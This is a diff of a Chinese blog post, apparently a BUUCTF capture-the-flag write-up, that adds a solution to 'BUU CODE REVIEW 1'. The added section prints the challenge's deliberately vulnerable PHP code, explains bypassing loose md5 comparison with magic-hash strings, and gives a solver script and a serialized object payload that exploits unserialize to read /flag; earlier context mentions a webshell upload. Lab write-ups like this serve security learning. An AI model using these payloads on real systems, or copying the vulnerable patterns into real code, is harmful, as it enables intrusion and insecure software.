@@ -55,7 +55,7 @@
 <meta itemprop="name" content="BUUCFT 题解">
 <meta itemprop="description" content="娱乐性质，玩一玩。 Linux Lab 使用 ssh 连接到靶机即可。 ssh root@address -p port flag.txt 就放在根目录下面。 BUUCFT 打开页面，首先给了一段代码。 &lt;?php /** * Created by PhpStorm. * User: jinzhao * Date: 2019/7/9 * Time: 7:07 AM */ highlight_file(__FILE__); if(isset($_GET[&#39;file&#39;]))"><meta itemprop="datePublished" content="2023-07-23T08:19:53+08:00" />
 <meta itemprop="dateModified" content="2023-07-23T08:19:53+08:00" />
-<meta itemprop="wordCount" content="826">
+<meta itemprop="wordCount" content="1121">
 <meta itemprop="keywords" content="BUUCFT,题解," /><meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="BUUCFT 题解"/>
 <meta name="twitter:description" content="娱乐性质，玩一玩。 Linux Lab 使用 ssh 连接到靶机即可。 ssh root@address -p port flag.txt 就放在根目录下面。 BUUCFT 打开页面，首先给了一段代码。 &lt;?php /** * Created by PhpStorm. * User: jinzhao * Date: 2019/7/9 * Time: 7:07 AM */ highlight_file(__FILE__); if(isset($_GET[&#39;file&#39;]))"/>
@@ -188,8 +188,8 @@
         <div class="post-category">
             <a href="/categories/buucft/"> BUUCFT </a>
             </div>
-          <span class="more-meta"> 约 826 字 </span>
-          <span class="more-meta"> 预计阅读 2 分钟 </span>
+          <span class="more-meta"> 约 1121 字 </span>
+          <span class="more-meta"> 预计阅读 3 分钟 </span>
         
       </div>
     </header>
@@ -210,6 +210,8 @@
             <li><a href="#pass-1">Pass 1</a></li>
           </ul>
         </li>
+        <li><a href="#buu-code-review-1">BUU CODE
+REVIEW 1</a></li>
       </ul>
     </li>
   </ul>
@@ -312,6 +314,77 @@ table_name=“xxx”</li>
 ，因为我用的需要上传两个文件，所以就上传了两遍。完成后查看回显地址，找到我们的
 webshell 链接。一旦打开，我们就成功骇入了。</p>
 <p>执行 <code>cat /flag</code> 即可获得 flag 。</p>
+<h2 id="buu-code-review-1">BUU CODE REVIEW 1</h2>
+<p>启动靶机，打开网页看到代码。</p>
+<div class="sourceCode" id="cb4"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;?php</span></span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a><span class="co">/**</span></span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a><span class="co"> * Created by PhpStorm.</span></span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a><span class="co"> * User: jinzhao</span></span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a><span class="co"> * Date: 2019/10/6</span></span>
+<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a><span class="co"> * Time: 8:04 PM</span></span>
+<span id="cb4-7"><a href="#cb4-7" aria-hidden="true" tabindex="-1"></a><span class="co"> */</span></span>
+<span id="cb4-8"><a href="#cb4-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-9"><a href="#cb4-9" aria-hidden="true" tabindex="-1"></a><span class="fu">highlight_file</span>(<span class="cn">__FILE__</span>)<span class="ot">;</span></span>
+<span id="cb4-10"><a href="#cb4-10" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-11"><a href="#cb4-11" aria-hidden="true" tabindex="-1"></a><span class="kw">class</span> <span class="cn">BUU</span> {</span>
+<span id="cb4-12"><a href="#cb4-12" aria-hidden="true" tabindex="-1"></a>   <span class="kw">public</span> <span class="va">$correct</span> <span class="op">=</span> <span class="st">&#34;&#34;</span><span class="ot">;</span></span>
+<span id="cb4-13"><a href="#cb4-13" aria-hidden="true" tabindex="-1"></a>   <span class="kw">public</span> <span class="va">$input</span> <span class="op">=</span> <span class="st">&#34;&#34;</span><span class="ot">;</span></span>
+<span id="cb4-14"><a href="#cb4-14" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-15"><a href="#cb4-15" aria-hidden="true" tabindex="-1"></a>   <span class="kw">public</span> <span class="kw">function</span> <span class="bu">__destruct</span>() {</span>
+<span id="cb4-16"><a href="#cb4-16" aria-hidden="true" tabindex="-1"></a>       <span class="cf">try</span> {</span>
+<span id="cb4-17"><a href="#cb4-17" aria-hidden="true" tabindex="-1"></a>           <span class="va">$this</span>-&gt;correct <span class="op">=</span> <span class="fu">base64_encode</span>(<span class="fu">uniqid</span>())<span class="ot">;</span></span>
+<span id="cb4-18"><a href="#cb4-18" aria-hidden="true" tabindex="-1"></a>           <span class="cf">if</span>(<span class="va">$this</span>-&gt;correct <span class="op">===</span> <span class="va">$this</span>-&gt;input) {</span>
+<span id="cb4-19"><a href="#cb4-19" aria-hidden="true" tabindex="-1"></a>               <span class="kw">echo</span> <span class="fu">file_get_contents</span>(<span class="st">&#34;/flag&#34;</span>)<span class="ot">;</span></span>
+<span id="cb4-20"><a href="#cb4-20" aria-hidden="true" tabindex="-1"></a>           }</span>
+<span id="cb4-21"><a href="#cb4-21" aria-hidden="true" tabindex="-1"></a>       } <span class="cf">catch</span> (<span class="bu">Exception</span> <span class="va">$e</span>) {</span>
+<span id="cb4-22"><a href="#cb4-22" aria-hidden="true" tabindex="-1"></a>       }</span>
+<span id="cb4-23"><a href="#cb4-23" aria-hidden="true" tabindex="-1"></a>   }</span>
+<span id="cb4-24"><a href="#cb4-24" aria-hidden="true" tabindex="-1"></a>}</span>
+<span id="cb4-25"><a href="#cb4-25" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-26"><a href="#cb4-26" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span>(<span class="va">$_GET</span>[<span class="st">&#39;pleaseget&#39;</span>] <span class="op">===</span> <span class="st">&#39;1&#39;</span>) {</span>
+<span id="cb4-27"><a href="#cb4-27" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span>(<span class="va">$_POST</span>[<span class="st">&#39;pleasepost&#39;</span>] <span class="op">===</span> <span class="st">&#39;2&#39;</span>) {</span>
+<span id="cb4-28"><a href="#cb4-28" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span>(<span class="fu">md5</span>(<span class="va">$_POST</span>[<span class="st">&#39;md51&#39;</span>]) <span class="op">==</span> <span class="fu">md5</span>(<span class="va">$_POST</span>[<span class="st">&#39;md52&#39;</span>]) <span class="op">&amp;&amp;</span> <span class="va">$_POST</span>[<span class="st">&#39;md51&#39;</span>] <span class="op">!=</span> <span class="va">$_POST</span>[<span class="st">&#39;md52&#39;</span>]) {</span>
+<span id="cb4-29"><a href="#cb4-29" aria-hidden="true" tabindex="-1"></a>            <span class="fu">unserialize</span>(<span class="va">$_POST</span>[<span class="st">&#39;obj&#39;</span>])<span class="ot">;</span></span>
+<span id="cb4-30"><a href="#cb4-30" aria-hidden="true" tabindex="-1"></a>        }</span>
+<span id="cb4-31"><a href="#cb4-31" aria-hidden="true" tabindex="-1"></a>    }</span>
+<span id="cb4-32"><a href="#cb4-32" aria-hidden="true" tabindex="-1"></a>}</span></code></pre></div>
+<p><code>pleaseget</code> 和 <code>pleasepost</code> 没有难度。MD5
+值相当但值不相等利用的是 php <code>==</code>
+的漏洞，如果两个字符串经过哈希后都以 <code>0E</code> 开头，PHP
+会把它们解释为 <code>0</code> 。比如，<code>QNKCDZO</code> 和
+<code>240610708</code> 。</p>
+<p>剩下的序列化是，由于 <code>uniqid()</code>
+得出的值以微秒计，所以不能用值生成来做。这里比较巧妙的采用了引用。</p>
+<div class="sourceCode" id="cb5"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;?php</span></span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a><span class="co">/**</span></span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a><span class="co"> * Created by PhpStorm.</span></span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a><span class="co"> * User: jinzhao</span></span>
+<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a><span class="co"> * Date: 2019/10/6</span></span>
+<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a><span class="co"> * Time: 8:04 PM</span></span>
+<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a><span class="co"> */</span></span>
+<span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-9"><a href="#cb5-9" aria-hidden="true" tabindex="-1"></a><span class="kw">class</span> <span class="cn">BUU</span> {</span>
+<span id="cb5-10"><a href="#cb5-10" aria-hidden="true" tabindex="-1"></a>   <span class="kw">public</span> <span class="va">$correct</span> <span class="op">=</span> <span class="st">&#34;&#34;</span><span class="ot">;</span></span>
+<span id="cb5-11"><a href="#cb5-11" aria-hidden="true" tabindex="-1"></a>   <span class="kw">public</span> <span class="va">$input</span> <span class="op">=</span> <span class="st">&#34;&#34;</span><span class="ot">;</span></span>
+<span id="cb5-12"><a href="#cb5-12" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-13"><a href="#cb5-13" aria-hidden="true" tabindex="-1"></a>   <span class="kw">public</span> <span class="kw">function</span> <span class="bu">__destruct</span>() {</span>
+<span id="cb5-14"><a href="#cb5-14" aria-hidden="true" tabindex="-1"></a>       <span class="cf">try</span> {</span>
+<span id="cb5-15"><a href="#cb5-15" aria-hidden="true" tabindex="-1"></a>           <span class="va">$this</span>-&gt;correct <span class="op">=</span> <span class="fu">base64_encode</span>(<span class="fu">uniqid</span>())<span class="ot">;</span></span>
+<span id="cb5-16"><a href="#cb5-16" aria-hidden="true" tabindex="-1"></a>           <span class="cf">if</span>(<span class="va">$this</span>-&gt;correct <span class="op">===</span> <span class="va">$this</span>-&gt;input) {</span>
+<span id="cb5-17"><a href="#cb5-17" aria-hidden="true" tabindex="-1"></a>               <span class="kw">echo</span> <span class="fu">file_get_contents</span>(<span class="st">&#34;/flag&#34;</span>)<span class="ot">;</span></span>
+<span id="cb5-18"><a href="#cb5-18" aria-hidden="true" tabindex="-1"></a>           }</span>
+<span id="cb5-19"><a href="#cb5-19" aria-hidden="true" tabindex="-1"></a>       } <span class="cf">catch</span> (<span class="bu">Exception</span> <span class="va">$e</span>) {</span>
+<span id="cb5-20"><a href="#cb5-20" aria-hidden="true" tabindex="-1"></a>       }</span>
+<span id="cb5-21"><a href="#cb5-21" aria-hidden="true" tabindex="-1"></a>   }</span>
+<span id="cb5-22"><a href="#cb5-22" aria-hidden="true" tabindex="-1"></a>}</span>
+<span id="cb5-23"><a href="#cb5-23" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-24"><a href="#cb5-24" aria-hidden="true" tabindex="-1"></a><span class="va">$a</span> <span class="op">=</span> <span class="kw">new</span> <span class="cn">BUU</span>()<span class="ot">;</span></span>
+<span id="cb5-25"><a href="#cb5-25" aria-hidden="true" tabindex="-1"></a><span class="va">$a</span> -&gt; input <span class="op">=</span> <span class="op">&amp;</span><span class="va">$a</span> -&gt; correct<span class="ot">;</span></span>
+<span id="cb5-26"><a href="#cb5-26" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-27"><a href="#cb5-27" aria-hidden="true" tabindex="-1"></a><span class="kw">echo</span> <span class="fu">serialize</span>(<span class="va">$a</span>)<span class="ot">;</span></span></code></pre></div>
+<p>结果是：</p>
+<pre><code>O:3:&#34;BUU&#34;:2:{s:7:&#34;correct&#34;;s:0:&#34;&#34;;s:5:&#34;input&#34;;R:2;}</code></pre>
+<p>然后把这些值往 postman 里填就行，记得是 POST 。</p>
 
 
 
